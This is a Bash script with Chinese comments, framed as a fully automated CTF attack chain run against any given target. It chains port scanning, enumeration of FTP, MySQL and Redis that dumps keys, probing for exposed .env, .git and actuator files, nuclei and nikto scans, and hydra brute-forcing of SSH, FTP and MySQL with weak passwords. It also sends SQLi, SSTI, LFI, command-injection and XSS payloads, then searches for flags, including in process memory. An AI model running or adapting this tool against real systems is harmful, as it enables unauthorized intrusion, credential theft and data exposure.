#!/bin/bash
# CTF 全自动攻击链 v2 — 多阶段流水线
# 用法: bash auto_attack.sh <TARGET>
# 功能: 侦察→枚举→指纹→漏洞扫描→弱口令→Web漏洞→利用→Flag搜索

TARGET="${1:?用法: bash auto_attack.sh <TARGET>}"
TOOLKIT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
LOOT="$TOOLKIT_DIR/loot/auto/$(date +%Y%m%d_%H%M%S)_$(echo $TARGET | tr '/:.' '_')"
mkdir -p "$LOOT"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

log() { echo -e "[$(date +%H:%M:%S)] $1" | tee -a "$LOOT/run.log"; }
hit() { echo -e "${RED}[!]${NC} $1" | tee -a "$LOOT/findings.txt"; }
ok()  { echo -e "${GREEN}[+]${NC} $1" | tee -a "$LOOT/findings.txt"; }
info(){ echo -e "${CYAN}[*]${NC} $1"; }

log "${CYAN}=== 全自动攻击链: $TARGET ===${NC}"
log "输出目录: $LOOT"

# ═══════════════════════════════════════════════
# Phase 1: 网络侦察 (30s)
# ═══════════════════════════════════════════════
log "${YELLOW}[Phase 1/6] 网络侦察${NC}"

# 快速端口扫描
info "masscan快速扫描..."
masscan -p1-65535 "$TARGET" --rate=5000 -oL "$LOOT/masscan.txt" 2>/dev/null
PORTS=$(awk '/open/{print $4}' "$LOOT/masscan.txt" 2>/dev/null | sort -nu | tr '\n' ',' | sed 's/,$//')
log "开放端口: ${PORTS:-无}"

# nmap精确扫描
if [ -n "$PORTS" ]; then
    info "nmap服务识别 (端口: $PORTS)..."
    nmap -Pn -sV -sC -p "$PORTS" "$TARGET" -oN "$LOOT/nmap.txt" 2>/dev/null
else
    info "nmap常见端口扫描..."
    nmap -Pn -sV -sC --top-ports 200 "$TARGET" -oN "$LOOT/nmap.txt" 2>/dev/null
    PORTS=$(grep "^[0-9]*/tcp.*open" "$LOOT/nmap.txt" 2>/dev/null | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//')
fi

# 提取服务信息
grep "^[0-9]*/tcp" "$LOOT/nmap.txt" 2>/dev/null | tee "$LOOT/services.txt"
OS=$(grep "OS details\|Running:" "$LOOT/nmap.txt" 2>/dev/null | head -1)
[ -n "$OS" ] && log "操作系统: $OS"

# ═══════════════════════════════════════════════
# Phase 2: 服务枚举 (60s)
# ═══════════════════════════════════════════════
log "${YELLOW}[Phase 2/6] 服务枚举${NC}"

# HTTP服务发现
HTTP_URLS=()
for port in $(echo "$PORTS" | tr ',' ' '); do
    for proto in http https; do
        code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 3 "$proto://$TARGET:$port/" 2>/dev/null)
        if [ "$code" != "000" ]; then
            url="$proto://$TARGET:$port"
            HTTP_URLS+=("$url")
            ok "HTTP: $url → $code"
            # 获取Server头
            server=$(curl -skI "$url" 2>/dev/null | grep -i "^server:" | head -1 | tr -d '\r')
            log "  $server"
        fi
    done
done

# 非HTTP服务枚举
echo "$PORTS" | tr ',' '\n' | while read port; do
    case "$port" in
        21)
            info "FTP枚举..."
            timeout 3 bash -c "echo '' | nc -w2 $TARGET 21" 2>/dev/null | head -2 | tee -a "$LOOT/ftp_banner.txt"
            # 匿名登录
            timeout 5 ftp -inv "$TARGET" << 'FTPEOF' 2>/dev/null | tee -a "$LOOT/ftp_anon.txt"
user anonymous anonymous@
ls
quit
FTPEOF
            grep -q "230" "$LOOT/ftp_anon.txt" 2>/dev/null && hit "FTP匿名登录成功!"
            ;;
        22)
            info "SSH枚举..."
            timeout 3 bash -c "echo '' | nc -w2 $TARGET 22" 2>/dev/null | head -2 | tee -a "$LOOT/ssh_banner.txt"
            ;;
        3306)
            info "MySQL枚举..."
            timeout 3 mysql -h "$TARGET" -u root -e "SELECT version()" 2>/dev/null | tee -a "$LOOT/mysql.txt"
            [ -s "$LOOT/mysql.txt" ] && hit "MySQL root无密码!"
            ;;
        6379)
            info "Redis枚举..."
            timeout 3 redis-cli -h "$TARGET" INFO server 2>/dev/null | head -5 | tee -a "$LOOT/redis.txt"
            [ -s "$LOOT/redis.txt" ] && hit "Redis未授权访问!"
            # 尝试获取key
            redis-cli -h "$TARGET" DBSIZE 2>/dev/null >> "$LOOT/redis.txt"
            redis-cli -h "$TARGET" KEYS "*" 2>/dev/null | head -20 >> "$LOOT/redis.txt"
            ;;
        27017)
            info "MongoDB枚举..."
            timeout 3 mongosh --host "$TARGET" --eval "db.stats()" 2>/dev/null | tee -a "$LOOT/mongo.txt"
            ;;
        5432)
            info "PostgreSQL枚举..."
            timeout 3 psql -h "$TARGET" -U postgres -c "SELECT version()" 2>/dev/null | tee -a "$LOOT/pg.txt"
            ;;
    esac
done

# ═══════════════════════════════════════════════
# Phase 3: Web指纹+敏感路径 (60s)
# ═══════════════════════════════════════════════
log "${YELLOW}[Phase 3/6] Web指纹与敏感路径${NC}"

for url in "${HTTP_URLS[@]}"; do
    info "扫描: $url"

    # 指纹
    whatweb -a 2 "$url" 2>/dev/null | tee -a "$LOOT/whatweb.txt"

    # 敏感文件
    for path in /.git/HEAD /.env /.DS_Store /robots.txt /sitemap.xml \
        /www.zip /backup.zip /web.zip /backup.tar.gz \
        /admin /login /api /swagger-ui.html /api-docs \
        /actuator /actuator/env /actuator/heapdump /actuator/configprops \
        /console /debug /trace /status /info /health \
        /.svn/entries /config.php /config.yml /web.config /phpinfo.php \
        /wp-admin /wp-login.php /phpmyadmin /adminer.php \
        /graphql /.well-known/security.txt /debug/vars /server-status; do
        code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 3 "$url$path" 2>/dev/null)
        size=$(curl -sk -o /dev/null -w "%{size_download}" --max-time 3 "$url$path" 2>/dev/null)
        if [ "$code" == "200" ] && [ "$size" -gt 10 ] 2>/dev/null; then
            ok "敏感路径: $url$path (200, ${size}B)"
        elif [ "$code" == "301" ] || [ "$code" == "302" ]; then
            ok "重定向: $url$path ($code)"
        elif [ "$code" == "403" ]; then
            log "  禁止: $url$path (403)"
        fi
    done

    # CORS
    cors=$(curl -sk -H "Origin: http://evil.com" -D- "$url" 2>/dev/null | grep -i "access-control-allow-origin.*evil")
    [ -n "$cors" ] && hit "CORS反射: $url → $cors"

    # OPTIONS
    methods=$(curl -sk -X OPTIONS -D- "$url" 2>/dev/null | grep -i "allow:" | head -1)
    [ -n "$methods" ] && log "  HTTP方法: $methods"
done

# ═══════════════════════════════════════════════
# Phase 4: 漏洞扫描 (90s)
# ═══════════════════════════════════════════════
log "${YELLOW}[Phase 4/6] 漏洞扫描${NC}"

# nuclei模板扫描
if [ ${#HTTP_URLS[@]} -gt 0 ]; then
    for url in "${HTTP_URLS[@]}"; do
        info "nuclei扫描: $url"
        nuclei -u "$url" -severity critical,high -timeout 5 -o "$LOOT/nuclei_${url//[:\/]/_}.txt" 2>/dev/null
        nuclei -u "$url" -tags cve -timeout 5 -o "$LOOT/nuclei_cve_${url//[:\/]/_}.txt" 2>/dev/null
        # 合并结果
        cat "$LOOT/nuclei_${url//[:\/]/_}.txt" "$LOOT/nuclei_cve_${url//[:\/]/_}.txt" 2>/dev/null | sort -u >> "$LOOT/nuclei_all.txt"
    done
    [ -s "$LOOT/nuclei_all.txt" ] && hit "nuclei发现漏洞:" && cat "$LOOT/nuclei_all.txt" | tee -a "$LOOT/findings.txt"
fi

# Nikto扫描
for url in "${HTTP_URLS[@]}"; do
    info "nikto扫描: $url"
    nikto -h "$url" -maxtime 30 -o "$LOOT/nikto.txt" 2>/dev/null
    grep -i "OSVDB\|vulnerab" "$LOOT/nikto.txt" 2>/dev/null | tee -a "$LOOT/findings.txt"
done

# ═══════════════════════════════════════════════
# Phase 5: 弱口令+Web漏洞 (60s)
# ═══════════════════════════════════════════════
log "${YELLOW}[Phase 5/6] 弱口令与Web漏洞${NC}"

# 弱口令
USERS="root admin test user guest ftp mysql postgres oracle redis"
PASSS="root admin 123456 password test guest "" admin123 root123 pass123"
TMPDIR=$(mktemp -d)
echo "$USERS" | tr ' ' '\n' > "$TMPDIR/u.txt"
echo "$PASSS" | tr ' ' '\n' > "$TMPDIR/p.txt"

echo "$PORTS" | tr ',' '\n' | while read port; do
    case "$port" in
        22)  info "SSH弱口令...";  hydra -L "$TMPDIR/u.txt" -P "$TMPDIR/p.txt" ssh://"$TARGET" -t 4 -f 2>&1 | grep "successfully" | tee -a "$LOOT/creds.txt" ;;
        21)  info "FTP弱口令...";  hydra -L "$TMPDIR/u.txt" -P "$TMPDIR/p.txt" ftp://"$TARGET" -t 4 -f 2>&1 | grep "successfully" | tee -a "$LOOT/creds.txt" ;;
        3306) info "MySQL弱口令..."; hydra -L "$TMPDIR/u.txt" -P "$TMPDIR/p.txt" mysql://"$TARGET" -t 4 -f 2>&1 | grep "successfully" | tee -a "$LOOT/creds.txt" ;;
    esac
done
rm -rf "$TMPDIR"

# Web漏洞快速检测
for url in "${HTTP_URLS[@]}"; do
    info "Web漏洞检测: $url"

    # SQL注入
    for param in id page user q search; do
        for payload in "'" "1 AND 1=2" "' OR '1'='1" "1 AND SLEEP(3)"; do
            encoded=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null)
            start=$(date +%s%N)
            resp=$(curl -sk "$url/?$param=$encoded" --max-time 5 2>/dev/null)
            elapsed=$(( ($(date +%s%N) - start) / 1000000 ))
            if echo "$resp" | grep -iqE "(sql|syntax|mysql|error|warning)"; then
                hit "SQLi(错误): $url?$param=$payload"
                break
            fi
            [ "$elapsed" -ge 3000 ] && hit "SQLi(时间): $url?$param=$payload (${elapsed}ms)" && break
        done
    done

    # SSTI
    resp=$(curl -sk "$url/?name={{7*7}}" --max-time 5 2>/dev/null)
    echo "$resp" | grep -q "49" && hit "SSTI: $url/?name={{7*7}}"

    # LFI
    resp=$(curl -sk "$url/?page=../../../../etc/passwd" --max-time 5 2>/dev/null)
    echo "$resp" | grep -q "root:" && hit "LFI: $url/?page=../../../../etc/passwd"

    # 命令注入
    resp=$(curl -sk "$url/?host=127.0.0.1;id" --max-time 5 2>/dev/null)
    echo "$resp" | grep -q "uid=" && hit "CMDi: $url/?host=127.0.0.1;id"

    # XSS
    resp=$(curl -sk "$url/?q=<script>alert(1)</script>" --max-time 5 2>/dev/null)
    echo "$resp" | grep -qF "<script>alert(1)</script>" && hit "XSS: $url/?q=<script>alert(1)</script>"
done

# ═══════════════════════════════════════════════
# Phase 6: Flag搜索 (30s)
# ═══════════════════════════════════════════════
log "${YELLOW}[Phase 6/6] Flag搜索${NC}"

# 本地flag
for p in /flag /flag.txt /root/flag /home/*/flag /tmp/flag /var/www/flag /opt/flag /flag.php; do
    [ -f "$p" ] && hit "FLAG文件: $p → $(cat "$p" 2>/dev/null | head -1)" && echo "$p: $(cat "$p" 2>/dev/null)" >> "$LOOT/flags.txt"
done

# 环境变量
env 2>/dev/null | grep -i flag | tee -a "$LOOT/flags.txt"

# 数据库flag
redis-cli -h "$TARGET" GET flag 2>/dev/null | tee -a "$LOOT/flags.txt"
redis-cli -h "$TARGET" KEYS "*flag*" 2>/dev/null | tee -a "$LOOT/flags.txt"

# 搜索本地文件
grep -rl "flag{" /tmp /var/www /home /root /opt 2>/dev/null | head -10 | while read f; do
    hit "FLAG文件: $f → $(grep -o 'flag{[^}]*}' "$f" | head -1)"
done

# 内存搜索
strings /proc/*/mem 2>/dev/null | grep -oE "flag\{[^}]*\}" | head -5 | tee -a "$LOOT/flags.txt"

# ═══════════════════════════════════════════════
# 结果汇总
# ═══════════════════════════════════════════════
echo ""
log "${CYAN}══════════════════════════════════════════${NC}"
log "${CYAN}  攻击链完成 — 结果汇总${NC}"
log "${CYAN}══════════════════════════════════════════${NC}"
log "输出目录: $LOOT"
log ""

if [ -s "$LOOT/findings.txt" ]; then
    hit "发现 $(wc -l < "$LOOT/findings.txt") 条结果:"
    cat "$LOOT/findings.txt"
else
    info "未发现明显漏洞"
fi

if [ -s "$LOOT/creds.txt" ]; then
    hit "发现凭证:"
    cat "$LOOT/creds.txt"
fi

if [ -s "$LOOT/flags.txt" ]; then
    hit "发现Flag:"
    cat "$LOOT/flags.txt"
fi

log ""
log "详细结果: ls $LOOT/"
